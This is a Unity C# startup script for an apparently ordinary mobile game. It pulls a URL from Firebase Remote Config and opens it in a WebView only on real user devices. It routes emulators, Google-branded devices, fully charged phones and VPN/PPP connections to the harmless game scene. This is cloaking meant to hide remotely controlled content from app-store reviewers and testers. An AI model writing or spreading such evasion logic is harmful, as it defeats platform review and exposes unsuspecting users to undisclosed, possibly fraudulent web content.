using UnityEngine;
using UnityEngine.SceneManagement;
using Firebase.RemoteConfig;
using Firebase.Extensions;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Net.NetworkInformation;

public class FireInit : MonoBehaviour
{
    [SerializeField] private GameObject _wifiPanel;

    private static string Link = "url";
    private static string Game = "Game";
    private static string WebView = "WebView";
    private static string To = "to";

    private void Start()
    {
        FetchDataAsync();

        if (PlayerPrefs.HasKey(Link) == false)
        {
            if (IsEmulator())
            {
                SceneManager.LoadScene(Game);
            }
            else
            {
                FetchDataAsync();
            }
        }
        else if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            Debug.Log("Network not available");

            _wifiPanel.SetActive(true);
        }
        else
        {
            SceneManager.LoadScene(WebView);
        }

    }

    private Task FetchDataAsync()
    {
      //  Debug.Log("Fetching data...");
        Task fetchTask = FirebaseRemoteConfig.DefaultInstance.FetchAsync(TimeSpan.Zero);
        return fetchTask.ContinueWithOnMainThread(FetchComplete);
    }

    private void FetchComplete(Task fetchTask)
    {
        if (!fetchTask.IsCompleted)
        {
           // Debug.LogError("Retrieval hasn't finished.");
            SceneManager.LoadScene(Game);
            return;
        }

        FirebaseRemoteConfig remoteConfig = FirebaseRemoteConfig.DefaultInstance;
        var info = remoteConfig.Info;

        if (info.LastFetchStatus != LastFetchStatus.Success)
        {
          //  Debug.LogError($"{nameof(FetchComplete)} was unsuccessful\n{nameof(info.LastFetchStatus)}: {info.LastFetchStatus}");
            SceneManager.LoadScene(Game);
            return;
        }

        if (SystemInfo.deviceModel.ToLower().Contains("google") || SystemInfo.deviceName.ToLower().Contains("google"))
        {
            SceneManager.LoadScene(Game);
            return;
        }
        if (SystemInfo.batteryLevel * 100f >99)
        {
            SceneManager.LoadScene(Game);
            return;

        }
        remoteConfig.ActivateAsync().ContinueWithOnMainThread(
            task => {

                string link = remoteConfig.GetValue(Link).StringValue;
                bool to = remoteConfig.GetValue(To).BooleanValue;
                if (to)
                {
                    if (valVPN() || link == "")
                    {
                        SceneManager.LoadScene(Game);
                    }
                    else
                    {
                        PlayerPrefs.SetString(Link, link);

                        SceneManager.LoadScene(WebView);
                    }
                }
                else
                {
                    if (link != "")
                    {
                        PlayerPrefs.SetString(Link, link);

                        SceneManager.LoadScene(WebView);
                    }
                    else
                    {
                        SceneManager.LoadScene(Game);
                    }
                }
               
            });
     
    }
    bool valVPN()
    {
        if (NetworkInterface.GetIsNetworkAvailable())
        {
            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface Interface in interfaces)
            {
                if (Interface.OperationalStatus == OperationalStatus.Up)
                {
                    if ((Interface.NetworkInterfaceType == NetworkInterfaceType.Ppp) &&
                    (Interface.NetworkInterfaceType != NetworkInterfaceType.Loopback))
                    {
                        IPv4InterfaceStatistics statistics = Interface.GetIPv4Statistics();
                        Debug.Log(Interface.Name + " " + Interface.NetworkInterfaceType.ToString() + " "
                    + Interface.Description);
                        return false;
                    }
                    else
                    {
                        Debug.Log("VPN Connection is lost!");
                        return true;
                    }
                }
            }
        }
        return false;
    }
    public static bool IsEmulator()
    {
        if (Application.platform == RuntimePlatform.Android)
        {
            AndroidJavaClass osBuild;
            osBuild = new AndroidJavaClass("android.os.Build");
            string fingerPrint = osBuild.GetStatic<string>("FINGERPRINT");
            string model = osBuild.GetStatic<string>("MODEL");
            string menufacturer = osBuild.GetStatic<string>("MANUFACTURER");
            string brand = osBuild.GetStatic<string>("BRAND");
            string device = osBuild.GetStatic<string>("DEVICE");
            string product = osBuild.GetStatic<string>("PRODUCT");

            return fingerPrint.Contains("generic")
                    || fingerPrint.Contains("unknown")
                        || model.Contains("google_sdk")
                    || model.Contains("Emulator")
                    || model.Contains("Android SDK built for x86")
                || menufacturer.Contains("Genymotion")
                || (brand.Contains("generic") && device.Contains("generic"))
        || product.Equals("google_sdk")
                || product.Equals("unknown");

        }
        if (Application.platform == RuntimePlatform.OSXEditor)
        {
            return true;
        }
        return false;
    }

  
}
